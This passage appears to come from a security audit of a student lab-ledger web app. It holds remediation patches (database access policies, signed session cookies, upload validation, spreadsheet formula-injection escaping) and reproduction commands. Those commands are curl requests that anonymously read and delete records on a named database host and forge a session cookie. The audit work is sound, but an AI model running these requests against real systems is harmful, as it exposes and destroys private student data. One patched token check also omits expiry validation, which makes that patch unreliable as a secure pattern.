ALTER TABLE session_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE lab_entries ENABLE ROW LEVEL SECURITY;

-- 2. Drop all insecure public policies
DROP POLICY IF EXISTS "app_access_students" ON students;
DROP POLICY IF EXISTS "app_access_lab_sessions" ON lab_sessions;
DROP POLICY IF EXISTS "app_access_session_photos" ON session_photos;
DROP POLICY IF EXISTS "app_access_lab_entries" ON lab_entries;

-- 3. Read access restricted exclusively to authenticated users
CREATE POLICY "allow_authenticated_read_students" ON students
  FOR SELECT TO authenticated USING (true);

CREATE POLICY "allow_authenticated_read_sessions" ON lab_sessions
  FOR SELECT TO authenticated USING (true);

CREATE POLICY "allow_authenticated_read_photos" ON session_photos
  FOR SELECT TO authenticated USING (true);

CREATE POLICY "allow_authenticated_read_entries" ON lab_entries
  FOR SELECT TO authenticated USING (true);

-- 4. Mutation access (INSERT, UPDATE, DELETE) restricted to authenticated users
CREATE POLICY "allow_authenticated_mutations_students" ON students
  FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE POLICY "allow_authenticated_mutations_sessions" ON lab_sessions
  FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE POLICY "allow_authenticated_mutations_photos" ON session_photos
  FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE POLICY "allow_authenticated_mutations_entries" ON lab_entries
  FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- 5. Revoke anonymous direct RPC execution
REVOKE EXECUTE ON ALL FUNCTIONS IN SCHEMA public FROM anon;
GRANT EXECUTE ON FUNCTION match_student TO authenticated;
GRANT EXECUTE ON FUNCTION flagged_systems TO authenticated;
GRANT EXECUTE ON FUNCTION student_history TO authenticated;
GRANT EXECUTE ON FUNCTION section_mismatches TO authenticated;
GRANT EXECUTE ON FUNCTION photos_due_for_deletion TO authenticated;

-- 6. Add uniqueness constraint to prevent duplicate ghost sessions
ALTER TABLE lab_sessions 
  ADD CONSTRAINT uq_session_identity UNIQUE (session_date, section, class_name);
```

---

### 6.2 Patch 2: Cryptographic Session Middleware (`middleware.ts`)

**Rationale**: Eliminates `pathname.includes('.')` bypass. Implements HMAC-SHA256 signature verification on session cookies, issues 401 JSON for unauthenticated API requests, and injects HTTP security headers.

```typescript
// ==============================================================================
// SECURE EDGE MIDDLEWARE REPLACEMENT
// Target File: middleware.ts
// ==============================================================================

import { NextRequest, NextResponse } from 'next/server';
import crypto from 'crypto';

// Verify HMAC-SHA256 signed session token
function verifySessionToken(token: string | undefined): boolean {
  if (!token) return false;
  const secret = process.env.SESSION_SECRET;
  if (!secret) return false;

  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [b64Payload, signature] = parts;

  const expectedHmac = crypto
    .createHmac('sha256', secret)
    .update(b64Payload)
    .digest('base64url');

  if (signature.length !== expectedHmac.length) return false;
  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedHmac))) {
    return false;
  }

  try {
    const payload = JSON.parse(Buffer.from(b64Payload, 'base64url').toString('utf8'));
    if (!payload.exp || Date.now() > payload.exp) {
      return false; // Token expired
    }
    return true;
  } catch {
    return false;
  }
}

// Explicit whitelist of allowed static file extensions
const STATIC_ASSET_REGEX = /\.(ico|png|jpg|jpeg|svg|css|js|woff|woff2|webmanifest|json)$/i;

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // 1. Whitelist explicit public authentication and webhook routes
  if (
    pathname === '/login' ||
    pathname === '/api/auth/login' ||
    pathname === '/api/auth/logout' ||
    pathname === '/api/backup'
  ) {
    return NextResponse.next();
  }

  // 2. Allow static Next.js assets and verified extensions (replaces pathname.includes('.'))
  if (
    pathname.startsWith('/_next') ||
    pathname === '/favicon.ico' ||
    pathname === '/manifest.json' ||
    pathname === '/sw.js' ||
    STATIC_ASSET_REGEX.test(pathname)
  ) {
    return NextResponse.next();
  }

  // 3. Verify cryptographic session token
  const sessionToken = request.cookies.get('lab_auth_session')?.value;
  if (!verifySessionToken(sessionToken)) {
    if (pathname.startsWith('/api/')) {
      return NextResponse.json(
        { error: 'Unauthorized: Valid faculty session required' },
        { status: 401 }
      );
    }

    const loginUrl = new URL('/login', request.url);
    // Sanitize redirect target to prevent open redirect
    const safeRedirect = pathname.startsWith('/') && !pathname.startsWith('//') ? pathname : '/';
    loginUrl.searchParams.set('redirect', safeRedirect);
    return NextResponse.redirect(loginUrl);
  }

  // 4. Inject HTTP Security Headers into all responses
  const response = NextResponse.next();
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  response.headers.set('Permissions-Policy', 'camera=(self), microphone=()');
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.supabase.co; connect-src 'self' https://*.supabase.co https://generativelanguage.googleapis.com; font-src 'self' data:;"
  );

  return response;
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

---

### 6.3 Patch 3: Secure Constant-Time Authentication Route (`app/api/auth/login/route.ts`)

**Rationale**: Mitigates timing attacks with `crypto.timingSafeEqual`, eliminates hardcoded credentials, implements IP-based rate limiting, and issues cryptographically signed session tokens.

```typescript
// ==============================================================================
// SECURE AUTHENTICATION LOGIN ROUTE
// Target File: app/api/auth/login/route.ts
// ==============================================================================

import { NextRequest, NextResponse } from 'next/server';
import crypto from 'crypto';

// In-memory rate limiting map for login attempts (IP -> { count, resetTime })
const loginAttempts = new Map<string, { count: number; resetTime: number }>();
const MAX_ATTEMPTS = 5;
const LOCKOUT_WINDOW_MS = 15 * 60 * 1000; // 15-minute lockout

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const record = loginAttempts.get(ip);
  if (!record || now > record.resetTime) {
    loginAttempts.set(ip, { count: 1, resetTime: now + LOCKOUT_WINDOW_MS });
    return true;
  }
  if (record.count >= MAX_ATTEMPTS) {
    return false;
  }
  record.count++;
  return true;
}

// Constant-time string equality check to prevent side-channel timing attacks
function timingSafeEqual(a: string, b: string): boolean {
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) {
    crypto.timingSafeEqual(bufA, bufA); // Perform dummy comparison to equalize time
    return false;
  }
  return crypto.timingSafeEqual(bufA, bufB);
}

// Generate cryptographically signed HMAC-SHA256 session token
function signSessionToken(username: string): string {
  const secret = process.env.SESSION_SECRET;
  if (!secret) {
    throw new Error('FATAL: SESSION_SECRET is not configured.');
  }
  const payload = JSON.stringify({
    user: username,
    iat: Date.now(),
    exp: Date.now() + 24 * 60 * 60 * 1000, // 24-hour expiration
    nonce: crypto.randomBytes(16).toString('hex'),
  });
  const b64Payload = Buffer.from(payload).toString('base64url');
  const hmac = crypto.createHmac('sha256', secret).update(b64Payload).digest('base64url');
  return `${b64Payload}.${hmac}`;
}

export async function POST(request: NextRequest) {
  try {
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || '127.0.0.1';
    if (!checkRateLimit(ip)) {
      return NextResponse.json(
        { error: 'Too many failed login attempts. Please wait 15 minutes.' },
        { status: 429 }
      );
    }

    const { username, password } = await request.json();

    const expectedUser = process.env.LAB_ADMIN_USERNAME;
    const expectedPass = process.env.LAB_ADMIN_PASSWORD;

    if (!expectedUser || !expectedPass) {
      console.error('FATAL: LAB_ADMIN_USERNAME or LAB_ADMIN_PASSWORD missing in environment.');
      return NextResponse.json({ error: 'Server authentication configuration error' }, { status: 500 });
    }

    const userValid = username && timingSafeEqual(username.trim().toLowerCase(), expectedUser.toLowerCase());
    const passValid = password && timingSafeEqual(password.trim(), expectedPass.trim());

    if (userValid && passValid) {
      loginAttempts.delete(ip); // Reset rate limit on success

      const token = signSessionToken(expectedUser);
      const response = NextResponse.json({ success: true, message: 'Logged in successfully' });

      response.cookies.set('lab_auth_session', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        path: '/',
        maxAge: 60 * 60 * 24, // 24 hours
      });

      return response;
    }

    return NextResponse.json({ error: 'Invalid username or password' }, { status: 401 });
  } catch (err) {
    console.error('Login error:', err);
    return NextResponse.json({ error: 'Invalid request' }, { status: 500 });
  }
}
```

---

### 6.4 Patch 4: Authenticated, Rate-Limited OCR Ingestion Pipeline (`app/api/ocr/route.ts`)

**Rationale**: Enforces internal authentication, limits photo bounds, validates image magic bytes, throttles Gemini concurrency, integrates real fuzzy matching via `lib/matching.ts`, and rolls back sessions on insertion failure.

```typescript
// ==============================================================================
// SECURE OCR INGESTION ROUTE WITH REAL ROSTER MATCHING
// Target File: app/api/ocr/route.ts
// ==============================================================================

import { NextRequest, NextResponse } from 'next/server';
import { extractLedgerData } from '@/lib/gemini';
import { createServerClient } from '@/lib/supabase';
import { matchAllEntriesFast } from '@/lib/matching';
import { OcrResult } from '@/lib/types';
import crypto from 'crypto';

export const maxDuration = 60;

const MAX_PHOTOS = 5;
const MAX_FILE_SIZE = 8 * 1024 * 1024; // 8MB per photo
const ALLOWED_MIME_TYPES = new Set(['image/jpeg', 'image/png', 'image/webp']);

// Verify session token inside route (Defense-in-Depth)
function isAuthenticated(request: NextRequest): boolean {
  const token = request.cookies.get('lab_auth_session')?.value;
  if (!token) return false;
  const secret = process.env.SESSION_SECRET;
  if (!secret) return false;
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [b64Payload, signature] = parts;
  const expectedHmac = crypto.createHmac('sha256', secret).update(b64Payload).digest('base64url');
  return crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedHmac));
}

// Validate file magic bytes against MIME type
function isValidImageSignature(buffer: Buffer, mimeType: string): boolean {
  if (buffer.length < 4) return false;
  if (mimeType === 'image/jpeg') {
    return buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff;
  }
  if (mimeType === 'image/png') {
    return buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4e && buffer[3] === 0x47;
  }
  if (mimeType === 'image/webp') {
    return buffer.toString('ascii', 0, 4) === 'RIFF' && buffer.toString('ascii', 8, 12) === 'WEBP';
  }
  return false;
}

export async function POST(request: NextRequest) {
  let createdSessionId: string | null = null;
  const supabase = createServerClient();

  try {
    // 1. Mandatory Route Authentication
    if (!isAuthenticated(request)) {
      return NextResponse.json({ error: 'Unauthorized: Valid faculty session required' }, { status: 401 });
    }

    const body = await request.json();
    const { photos, sessionDate, section, className, facultyName } = body;

    if (!Array.isArray(photos) || photos.length === 0) {
      return NextResponse.json({ error: 'No photos provided' }, { status: 400 });
    }

    if (photos.length > MAX_PHOTOS) {
      return NextResponse.json({ error: `Maximum ${MAX_PHOTOS} photos allowed per session` }, { status: 400 });
    }

    // 2. Validate payloads and file signatures
    const validatedPhotos: { buffer: Buffer; mimeType: string; pageNumber: number }[] = [];
    for (const photo of photos) {
      if (!photo.base64 || !photo.mimeType || !ALLOWED_MIME_TYPES.has(photo.mimeType)) {
        return NextResponse.json({ error: `Invalid image format: ${photo.mimeType}` }, { status: 400 });
      }
      const buffer = Buffer.from(photo.base64, 'base64');
      if (buffer.length > MAX_FILE_SIZE) {
        return NextResponse.json({ error: 'Image exceeds maximum 8MB limit' }, { status: 400 });
      }
      if (!isValidImageSignature(buffer, photo.mimeType)) {
        return NextResponse.json({ error: 'File contents do not match specified image MIME type' }, { status: 400 });
      }
      validatedPhotos.push({
        buffer,
        mimeType: photo.mimeType,
        pageNumber: Math.max(1, Math.floor(Number(photo.pageNumber) || 1)),
      });
    }

    // 3. Process Gemini OCR sequentially or in small batches to respect quota
    const sortedPhotos = [...validatedPhotos].sort((a, b) => a.pageNumber - b.pageNumber);
    const ocrResults: { result: OcrResult; pageNumber: number }[] = [];
    for (const photo of sortedPhotos) {
      try {
        const base64Str = photo.buffer.toString('base64');
        const result = await extractLedgerData(base64Str, photo.mimeType);
        ocrResults.push({ result, pageNumber: photo.pageNumber });
      } catch (err) {
        console.error(`OCR processing failed for page ${photo.pageNumber}:`, err);
      }
    }

    if (ocrResults.length === 0) {
      return NextResponse.json({ error: 'OCR extraction failed for all uploaded pages' }, { status: 500 });
    }

    const firstResult = ocrResults[0].result;
    const header = firstResult.header;
    const allRows = ocrResults.flatMap((r) => r.result.rows);

    // Date normalization
    const finalDate = header.date || sessionDate || new Date().toISOString().split('T')[0];

    // 4. Create lab_sessions record
    const { data: session, error: sessionError } = await supabase
      .from('lab_sessions')
      .insert({
        session_date: finalDate,
        section: header.section || section || null,
        class_name: header.class || className || null,
        faculty_name: header.faculty_name || facultyName || null,
        total_system_count: allRows.length,
      })
      .select()
      .single();

    if (sessionError || !session) {
      throw new Error(`Failed to create session: ${sessionError?.message}`);
    }
    createdSessionId = session.id;

    // 5. Execute genuine fuzzy roster matching against students table
    const matchQueries = allRows.map((r) => ({
      name: r.name || '',
      ucms_no: r.ucms_no || '',
    }));
    const matchResults = await matchAllEntriesFast(matchQueries);

    const entriesToInsert = allRows.map((row, idx) => {
      const match = matchResults[idx];
      return {
        session_id: session.id,
        sl_no: idx + 1,
        raw_name_ocr: row.name || '',
        raw_ucms_ocr: row.ucms_no || '',
        system_no: row.system_no || null,
        signature_present: Boolean(row.signature_present),
        remarks: row.remarks || null,
        student_id: match?.student_id || null,
        matched: Boolean(match && match.confidence >= 0.6),
        ocr_confidence: match ? match.confidence : 0.0,
      };
    });

    // 6. Insert lab entries
    const { error: entriesError } = await supabase.from('lab_entries').insert(entriesToInsert);
    if (entriesError) throw entriesError;

    return NextResponse.json({
      sessionId: session.id,
      totalPhotos: ocrResults.length,
      totalEntries: entriesToInsert.length,
      matchedEntries: entriesToInsert.filter((e) => e.matched).length,
    });
  } catch (err) {
    // Rollback session if entry creation failed to prevent ghost sessions
    if (createdSessionId) {
      await supabase.from('lab_sessions').delete().eq('id', createdSessionId);
    }
    console.error('OCR Pipeline Error:', err);
    return NextResponse.json(
      { error: err instanceof Error ? err.message : 'Internal processing error' },
      { status: 500 }
    );
  }
}
```

---

### 6.5 Patch 5: Race-Free Session Review Table Grid (`components/SessionTable.tsx`)

**Rationale**: Fixes debounce race conditions by clearing pending timers during add/delete operations, generates unique UUID keys to prevent input state stomping, and manages clean parent emission.

```typescript
// ==============================================================================
// SECURE, RACE-FREE SESSION REVIEW TABLE
// Target File: components/SessionTable.tsx
// ==============================================================================

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { LabEntry } from '@/lib/types';
import { Trash2, Plus } from 'lucide-react';

interface SessionTableProps {
  entries: LabEntry[];
  sessionId: string;
  editable: boolean;
  onEntriesChange?: (entries: LabEntry[]) => void;
}

export const SessionTable: React.FC<SessionTableProps> = ({
  entries: initialEntries,
  sessionId,
  editable,
  onEntriesChange,
}) => {
  const [entries, setEntries] = useState<LabEntry[]>(initialEntries);
  const debounceTimerRef = useRef<NodeJS.Timeout | null>(null);
  const lastEmittedRef = useRef<LabEntry[]>(initialEntries);

  // Sync external entry updates safely
  useEffect(() => {
    if (initialEntries !== lastEmittedRef.current) {
      setEntries(initialEntries);
      lastEmittedRef.current = initialEntries;
    }
  }, [initialEntries]);

  // Clean up debounce timer on component unmount
  useEffect(() => {
    return () => {
      if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
    };
  }, []);

  const notifyParent = useCallback(
    (updated: LabEntry[]) => {
      lastEmittedRef.current = updated;
      onEntriesChange?.(updated);
    },
    [onEntriesChange]
  );

  const updateEntry = (index: number, field: keyof LabEntry, value: unknown) => {
    const updated = [...entries];
    updated[index] = { ...updated[index], [field]: value };
    setEntries(updated);

    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
    debounceTimerRef.current = setTimeout(() => {
      notifyParent(updated);
    }, 200);
  };

  // Crucial Fix: Clear pending debounce timer before deleting
  const deleteEntry = (index: number) => {
    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
    const updated = entries.filter((_, i) => i !== index);
    setEntries(updated);
    notifyParent(updated);
  };

  // Crucial Fix: Clear pending debounce timer before adding
  const addRow = () => {
    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
    const newEntry: LabEntry = {
      id: `temp-${crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substring(2)}`,
      session_id: sessionId,
      sl_no: entries.length + 1,
      raw_name_ocr: '',
      raw_ucms_ocr: '',
      student_id: null,
      system_no: '',
      signature_present: false,
      signature_crop_url: null,
      ocr_confidence: null,
      matched: false,
      remarks: '',
      student: null,
    };
    const updated = [...entries, newEntry];
    setEntries(updated);
    notifyParent(updated);
  };

  return (
    <div className="overflow-x-auto rounded-xl border border-gray-200 bg-white shadow-sm">
      <table className="min-w-full text-sm">
        <thead>
          <tr className="border-b border-gray-200 bg-gray-50">
            <th className="px-3 py-3 text-left font-semibold text-gray-600 w-12">SL</th>
            <th className="px-3 py-3 text-left font-semibold text-gray-600 min-w-[180px]">Student Name</th>
            <th className="px-3 py-3 text-left font-semibold text-gray-600 min-w-[140px]">UUCMS No.</th>
            <th className="px-3 py-3 text-left font-semibold text-gray-600 min-w-[100px]">System No</th>
            <th className="px-3 py-3 text-center font-semibold text-gray-600 min-w-[70px]">Signed</th>
            <th className="px-3 py-3 text-left font-semibold text-gray-600 min-w-[180px]">Remarks</th>
            {editable && <th className="px-3 py-3 text-center font-semibold text-gray-600 w-16">Action</th>}
          </tr>
        </thead>
        <tbody className="divide-y divide-gray-100">
          {entries.map((entry, idx) => (
            <tr key={entry.id} className="hover:bg-gray-50 transition-colors">
              <td className="px-3 py-2 text-gray-500 font-mono text-xs">{idx + 1}</td>
              <td className="px-3 py-2">
                {editable ? (
                  <input
                    type="text"
                    value={entry.raw_name_ocr || ''}
                    onChange={(e) => updateEntry(idx, 'raw_name_ocr', e.target.value)}
                    className="w-full rounded border border-gray-300 px-2 py-1 text-sm focus:border-blue-500 focus:outline-none"
                  />
                ) : (
                  <span className="font-medium text-gray-800">{entry.raw_name_ocr || '—'}</span>
                )}
              </td>
              <td className="px-3 py-2">
                {editable ? (
                  <input
                    type="text"
                    value={entry.raw_ucms_ocr || ''}
                    onChange={(e) => updateEntry(idx, 'raw_ucms_ocr', e.target.value)}
                    className="w-full rounded border border-gray-300 px-2 py-1 text-sm font-mono focus:border-blue-500 focus:outline-none"
                  />
                ) : (
                  <span className="font-mono text-gray-600">{entry.raw_ucms_ocr || '—'}</span>
                )}
              </td>
              <td className="px-3 py-2">
                {editable ? (
                  <input
                    type="text"
                    value={entry.system_no || ''}
                    onChange={(e) => updateEntry(idx, 'system_no', e.target.value)}
                    className="w-full rounded border border-gray-300 px-2 py-1 text-sm focus:border-blue-500 focus:outline-none"
                  />
                ) : (
                  <span className="text-gray-700">{entry.system_no || '—'}</span>
                )}
              </td>
              <td className="px-3 py-2 text-center">
                <input
                  type="checkbox"
                  checked={entry.signature_present}
                  disabled={!editable}
                  onChange={(e) => updateEntry(idx, 'signature_present', e.target.checked)}
                  className="h-4 w-4 rounded border-gray-300 text-blue-600 focus:ring-blue-500"
                />
              </td>
              <td className="px-3 py-2">
                {editable ? (
                  <input
                    type="text"
                    value={entry.remarks || ''}
                    onChange={(e) => updateEntry(idx, 'remarks', e.target.value)}
                    className="w-full rounded border border-gray-300 px-2 py-1 text-sm focus:border-blue-500 focus:outline-none"
                  />
                ) : (
                  <span className="text-gray-500">{entry.remarks || '—'}</span>
                )}
              </td>
              {editable && (
                <td className="px-3 py-2 text-center">
                  <button
                    type="button"
                    onClick={() => deleteEntry(idx)}
                    className="rounded p-1 text-gray-400 hover:bg-red-50 hover:text-red-600 transition-colors"
                  >
                    <Trash2 className="h-4 w-4" />
                  </button>
                </td>
              )}
            </tr>
          ))}
        </tbody>
      </table>
      {editable && (
        <div className="border-t border-gray-100 p-3 bg-gray-50 flex justify-between items-center">
          <button
            type="button"
            onClick={addRow}
            className="flex items-center gap-1.5 rounded-lg border border-gray-300 bg-white px-3 py-1.5 text-xs font-semibold text-gray-700 hover:bg-gray-100 transition-colors shadow-sm"
          >
            <Plus className="h-3.5 w-3.5" />
            Add Row
          </button>
          <span className="text-xs text-gray-500">Total Entries: {entries.length}</span>
        </div>
      )}
    </div>
  );
};
```

---

### 6.6 Patch 6: Atomic Save & Row Deletion Persistence (`app/sessions/[id]/page.tsx`)

**Rationale**: Resolves the critical row deletion bug by computing missing IDs and issuing `supabase.from('lab_entries').delete().in('id', deletedIds)`. Renders PDF document as a valid React JSX element.

```typescript
// ==============================================================================
// PERSISTENT ROW DELETION PATCH FOR SESSION DETAIL
// Snippet for app/sessions/[id]/page.tsx: handleSaveEntries
// ==============================================================================

  const handleSaveEntries = async () => {
    setSaving(true);
    try {
      const supabase = createBrowserClient();

      const currentNonTempIds = new Set(
        entries.filter((e) => !e.id.startsWith('temp-')).map((e) => e.id)
      );

      // 1. Identify rows that were deleted by the user and delete them from DB
      const deletedIds = savedEntriesRef.current
        .filter((saved) => !currentNonTempIds.has(saved.id))
        .map((saved) => saved.id);

      if (deletedIds.length > 0) {
        const { error: deleteError } = await supabase
          .from('lab_entries')
          .delete()
          .in('id', deletedIds);

        if (deleteError) throw deleteError;
      }

      // 2. Identify modified rows and update them
      const existingEntries = entries.filter((e) => !e.id.startsWith('temp-'));
      const modifiedEntries = existingEntries.filter((curr) => {
        const prev = savedEntriesRef.current.find((s) => s.id === curr.id);
        if (!prev) return true;
        return (
          prev.raw_name_ocr !== curr.raw_name_ocr ||
          prev.raw_ucms_ocr !== curr.raw_ucms_ocr ||
          prev.system_no !== curr.system_no ||
          prev.signature_present !== curr.signature_present ||
          prev.remarks !== curr.remarks ||
          prev.student_id !== curr.student_id ||
          prev.matched !== curr.matched
        );
      });

      if (modifiedEntries.length > 0) {
        await Promise.all(
          modifiedEntries.map((entry) =>
            supabase
              .from('lab_entries')
              .update({
                raw_name_ocr: entry.raw_name_ocr,
                raw_ucms_ocr: entry.raw_ucms_ocr,
                system_no: entry.system_no,
                signature_present: entry.signature_present,
                remarks: entry.remarks,
                student_id: entry.student_id,
                matched: entry.matched,
              })
              .eq('id', entry.id)
          )
        );
      }

      // 3. Insert newly added rows
      const newEntries = entries.filter((e) => e.id.startsWith('temp-'));
      if (newEntries.length > 0) {
        const { error: insertError } = await supabase.from('lab_entries').insert(
          newEntries.map((entry, idx) => ({
            session_id: sessionId,
            sl_no: existingEntries.length + idx + 1,
            raw_name_ocr: entry.raw_name_ocr || null,
            raw_ucms_ocr: entry.raw_ucms_ocr || null,
            system_no: entry.system_no || null,
            signature_present: entry.signature_present,
            remarks: entry.remarks || null,
            student_id: entry.student_id || null,
            matched: entry.matched,
          }))
        );
        if (insertError) throw insertError;
      }

      toast.success('Changes saved successfully');
      await loadSession();
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Save failed';
      toast.error(message);
    } finally {
      setSaving(false);
    }
  };
```

---

### 6.7 Patch 7: Formula Injection Sanitization for Excel Workbooks (`lib/export-excel.ts`)

**Rationale**: Neutralizes Formula Injection (CWE-1236) by prepending a single quote `'` to any cell string beginning with `=`, `+`, `-`, `@`, `\t`, or `\r`. Cleans sheet names of prohibited characters.

```typescript
// ==============================================================================
// FORMULA INJECTION SANITIZED EXCEL EXPORT
// Target File: lib/export-excel.ts
// ==============================================================================

import * as XLSX from 'xlsx';
import { LabSession, LabEntry, Student } from './types';

interface ExportEntry extends LabEntry {
  student?: Student | null;
}

// Neutralize formula execution triggers in Excel
function sanitizeCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const str = String(value).trim();
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`; // Single quote forces Excel to treat as literal string
  }
  return str;
}

export function generateSessionExcel(
  session: LabSession,
  entries: ExportEntry[]
): XLSX.WorkBook {
  const wb = XLSX.utils.book_new();

  const headerData = [
    ['COMPUTER LAB LEDGER'],
    [],
    ['Date:', sanitizeCell(session.session_date), '', 'Section:', sanitizeCell(session.section)],
    ['Class:', sanitizeCell(session.class_name), '', 'Faculty:', sanitizeCell(session.faculty_name)],
    [],
    ['SL.NO', 'NAME', 'UUCMS NO.', 'SYSTEM NO.', 'SIGNED', 'REMARKS'],
  ];

  const dataRows = entries
    .sort((a, b) => (a.sl_no || 0) - (b.sl_no || 0))
    .map((entry, idx) => [
      idx + 1,
      sanitizeCell(entry.student?.name || entry.raw_name_ocr),
      sanitizeCell(entry.student?.ucms_no || entry.raw_ucms_ocr),
      sanitizeCell(entry.system_no),
      entry.signature_present ? 'Yes' : 'No',
      sanitizeCell(entry.remarks),
    ]);

  const totalsRow = [
    '',
    `Total Students: ${entries.length}`,
    '',
    `Systems: ${session.total_system_count ?? entries.length}`,
    `Mouse: ${session.total_mouse_count ?? ''}`,
    `Keyboard: ${session.total_keyboard_count ?? ''}`,
  ];

  const remarksRow = session.remarks ? ['', `Remarks: ${sanitizeCell(session.remarks)}`] : [];

  const allRows = [
    ...headerData,
    ...dataRows,
    [],
    totalsRow,
    ...(remarksRow.length ? [remarksRow] : []),
  ];

  const ws = XLSX.utils.aoa_to_sheet(allRows);
  ws['!cols'] = [
    { wch: 8 }, { wch: 30 }, { wch: 18 }, { wch: 12 }, { wch: 10 }, { wch: 25 },
  ];
  ws['!merges'] = [{ s: { r: 0, c: 0 }, e: { r: 0, c: 5 } }];

  // Sanitize sheet name against prohibited characters: \ / ? * [ ] :
  const cleanDate = (session.session_date || 'session').replace(/[/\\?*:[\]]/g, '-');
  const cleanSection = (session.section || 'all').replace(/[/\\?*:[\]]/g, '_');
  const sheetName = `${cleanDate}_${cleanSection}`.substring(0, 31);

  XLSX.utils.book_append_sheet(wb, ws, sheetName);
  return wb;
}
```

---

### 6.8 Patch 8: Gemini API Error Recovery & Schema Validation (`lib/gemini.ts`)

**Rationale**: Removes non-existent model `gemini-3.6-flash`, guarantees cleanup of timeouts in `finally` blocks, and validates OCR JSON structure.

```typescript
// ==============================================================================
// HARDENED GEMINI CLIENT WITH SCHEMA VALIDATION
// Snippet for lib/gemini.ts
// ==============================================================================

// Whitelist of genuine GA Gemini model endpoints
const FALLBACK_MODELS = [
  'gemini-2.0-flash',
  'gemini-1.5-flash',
  'gemini-1.5-pro',
];

export async function extractLedgerData(
  photoBase64: string,
  mimeType: string = 'image/jpeg'
): Promise<OcrResult> {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) throw new Error('GEMINI_API_KEY environment variable is not configured');

  let lastError: unknown = null;

  for (const modelName of FALLBACK_MODELS) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout

    try {
      const res = await fetch(
        `https://generativelanguage.googleapis.com/v1beta/models/${modelName}:generateContent`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-goog-api-key': apiKey,
          },
          body: JSON.stringify({
            contents: [
              {
                parts: [
                  { inlineData: { mimeType, data: photoBase64 } },
                  { text: OCR_PROMPT },
                ],
              },
            ],
            generationConfig: { responseMimeType: 'application/json' },
          }),
          signal: controller.signal,
        }
      );

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData?.error?.message || `HTTP ${res.status}: ${res.statusText}`);
      }

      const resJson = await res.json();
      const text = resJson.candidates?.[0]?.content?.parts?.[0]?.text;
      if (!text) throw new Error('Empty text content received from model');

      let jsonStr = text.trim();
      const jsonMatch = jsonStr.match(/```(?:json)?\s*([\s\S]*?)```/);
      if (jsonMatch) jsonStr = jsonMatch[1].trim();

      const parsed = JSON.parse(jsonStr) as OcrResult;
      if (!parsed || typeof parsed !== 'object' || !Array.isArray(parsed.rows)) {
        throw new Error('Malformed OCR JSON structure returned by Gemini');
      }

      return parsed;
    } catch (err) {
      console.warn(`Gemini model ${modelName} failed:`, err);
      lastError = err;
    } finally {
      clearTimeout(timeoutId); // Guarantee timer cleanup
    }
  }

  throw new Error(`OCR failed across all models. Last error: ${lastError instanceof Error ? lastError.message : 'Unknown'}`);
}
```

---

### 6.9 Patch 9: Open Redirect Neutralization (`app/login/page.tsx`)

**Rationale**: Validates the `redirect` query parameter to ensure it is strictly a relative pathname, preventing external redirects.

```typescript
// ==============================================================================
// OPEN REDIRECT SANITIZATION
// Target File: app/login/page.tsx:11-13, 43
// ==============================================================================

  const searchParams = useSearchParams();
  const rawRedirect = searchParams.get('redirect') || '/';

  // Strictly enforce relative path starting with single '/'
  const safeRedirect =
    rawRedirect.startsWith('/') && !rawRedirect.startsWith('//') && !rawRedirect.includes(':')
      ? rawRedirect
      : '/';

  // Inside handleLogin after successful auth:
  router.push(safeRedirect);
```

---

## 7. Verification & Reproduction Commands

The following commands allow external auditors to verify all reported vulnerabilities without altering codebase files.

### 7.1 Test 1: Anonymous Supabase Database Read & Delete (RLS Bypass)
```bash
# 1. Query full student roster anonymously directly from Supabase PostgREST
curl -X GET "https://trhyseqzcjrkctwuwrzu.supabase.co/rest/v1/students?select=*" \
  -H "apikey: <NEXT_PUBLIC_SUPABASE_ANON_KEY>" \
  -H "Authorization: Bearer <NEXT_PUBLIC_SUPABASE_ANON_KEY>"

# Expected Result: Full JSON array of student records, proving RLS is neutralized.

# 2. Test deletion capability using anon key (Dry run targeting non-existent UUID)
curl -i -X DELETE "https://trhyseqzcjrkctwuwrzu.supabase.co/rest/v1/lab_entries?id=eq.00000000-0000-0000-0000-000000000000" \
  -H "apikey: <NEXT_PUBLIC_SUPABASE_ANON_KEY>" \
  -H "Authorization: Bearer <NEXT_PUBLIC_SUPABASE_ANON_KEY>"

# Expected Result: HTTP 204 No Content, confirming anonymous write/delete permissions.
```

### 7.2 Test 2: Unauthenticated Cookie Forgery Attack
```bash
# Request protected administrative sessions page with forged static cookie
curl -i "http://localhost:3000/sessions" \
  -H "Cookie: lab_auth_session=authenticated"

